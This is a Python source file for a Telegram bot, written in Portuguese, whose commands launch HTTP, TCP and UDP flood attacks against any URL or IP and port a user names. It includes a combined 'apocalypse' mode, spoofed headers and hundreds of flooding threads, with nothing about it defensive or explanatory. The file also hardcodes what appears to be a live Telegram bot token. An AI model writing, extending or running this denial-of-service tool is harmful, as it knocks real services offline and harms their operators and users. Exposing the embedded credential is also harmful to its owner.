import asyncio 
import aiohttp 
import random 
import socket 
import threading 
import time 
import os 
from concurrent.futures import ThreadPoolExecutor 
from datetime import datetime 
from urllib.parse import urlparse 
from telegram import Update 
from telegram.ext import Application, CommandHandler, ContextTypes 
 
TOKEN = "8821809288:AAHFDFvxzc9bWIg89quBoIQf9fAO2KZYvOM" 
PORT = int(os.environ.get("PORT", 8080)) 
 
MAX_THREADS = 2000 
TIMEOUT = 1.0 
 
USER_AGENTS = [ 
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36", 
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15", 
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15", 
] 
 
def random_ip(): 
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}" 
 
async def http_tsunami(url, duration_sec, threads=1000): 
    end_time = asyncio.get_event_loop().time() + duration_sec 
    async def hammer(): 
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=0, ssl=False) 
        async with aiohttp.ClientSession(connector=connector) as session: 
            while asyncio.get_event_loop().time() < end_time: 
                try: 
                    headers = {"User-Agent": random.choice(USER_AGENTS), "X-Forwarded-For": random_ip()} 
                    await session.get(url, headers=headers, timeout=1) 
                    await session.post(url, headers=headers, timeout=1) 
                except: 
                    pass 
    tasks = [hammer() for _ in range(threads)] 
    await asyncio.gather(*tasks, return_exceptions=True) 
 
def udp_extreme(target_ip, target_port, duration_sec): 
    end_time = time.time() + duration_sec 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    packets = [random._urandom(65507), random._urandom(8192), random._urandom(4096)] 
    def udp_blast(): 
        while time.time() < end_time: 
            try: 
                sock.sendto(random.choice(packets), (target_ip, target_port)) 
            except: 
                pass 
    threads = [] 
    for _ in range(500): 
        t = threading.Thread(target=udp_blast) 
        t.start() 
        threads.append(t) 
    for t in threads: 
        t.join() 
 
async def tcp_hammer(target_ip, target_port, duration_sec): 
    end_time = asyncio.get_event_loop().time() + duration_sec 
    payloads = [b"GET / HTTP/1.1\r\n", b"POST / HTTP/1.1\r\n", random._urandom(4096)] 
    def tcp_sender(): 
        while time.time() < end_time: 
            try: 
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                sock.settimeout(0.5) 
                sock.connect((target_ip, target_port)) 
                for _ in range(50): 
                    sock.send(random.choice(payloads)) 
                sock.close() 
            except: 
                pass 
    with ThreadPoolExecutor(max_workers=500) as executor: 
        futures = [executor.submit(tcp_sender) for _ in range(500)] 
        for f in futures: 
            f.result(timeout=duration_sec) 
 
async def start(update, context): 
    await update.message.reply_text("💀 **BOT DDoS EXTREME** 💀\n\n/http <url> <segundos>\n/tcp <ip> <porta> <segundos>\n/udp <ip> <porta> <segundos>\n/all <ip> <porta> <segundos> - MODO APOCALIPSE\n/stop", parse_mode='Markdown') 
 
async def http_cmd(update, context): 
    url = context.args[0] 
    duration = int(context.args[1]) 
    await update.message.reply_text(f"🌊 HTTP Tsunami em {url} por {duration}s") 
    await http_tsunami(url, duration) 
    await update.message.reply_text("✅ Finalizado") 
 
async def tcp_cmd(update, context): 
    ip = context.args[0] 
    port = int(context.args[1]) 
    duration = int(context.args[2]) 
    await update.message.reply_text(f"🔨 TCP Hammer em {ip}:{port} por {duration}s") 
    await tcp_hammer(ip, port, duration) 
    await update.message.reply_text("✅ Finalizado") 
 
async def udp_cmd(update, context): 
    ip = context.args[0] 
    port = int(context.args[1]) 
    duration = int(context.args[2]) 
    await update.message.reply_text(f"📡 UDP Extreme em {ip}:{port} por {duration}s") 
    loop = asyncio.get_event_loop() 
    await loop.run_in_executor(None, udp_extreme, ip, port, duration) 
    await update.message.reply_text("✅ Finalizado") 
 
async def all_cmd(update, context): 
    ip = context.args[0] 
    port = int(context.args[1]) 
    duration = int(context.args[2]) 
    await update.message.reply_text(f"💀 **MODO APOCALIPSE** em {ip}:{port} por {duration}s") 
    await asyncio.gather( 
        http_tsunami(f"http://{ip}", duration, 500), 
        tcp_hammer(ip, port, duration) 
    ) 
    loop = asyncio.get_event_loop() 
    loop.run_in_executor(None, udp_extreme, ip, port, duration) 
    await update.message.reply_text("💀 Modo Apocalipse finalizado") 
 
async def stop_cmd(update, context): 
    await update.message.reply_text("🛑 Todos os ataques interrompidos") 
 
def main(): 
    app = Application.builder().token(TOKEN).build() 
    app.add_handler(CommandHandler("start", start)) 
    app.add_handler(CommandHandler("http", http_cmd)) 
    app.add_handler(CommandHandler("tcp", tcp_cmd)) 
    app.add_handler(CommandHandler("udp", udp_cmd)) 
    app.add_handler(CommandHandler("all", all_cmd)) 
    app.add_handler(CommandHandler("stop", stop_cmd)) 
    print("💀 Bot DDoS Extreme rodando em Downloads") 
    app.run_polling() 
 
if __name__ == "__main__": 
    main() 
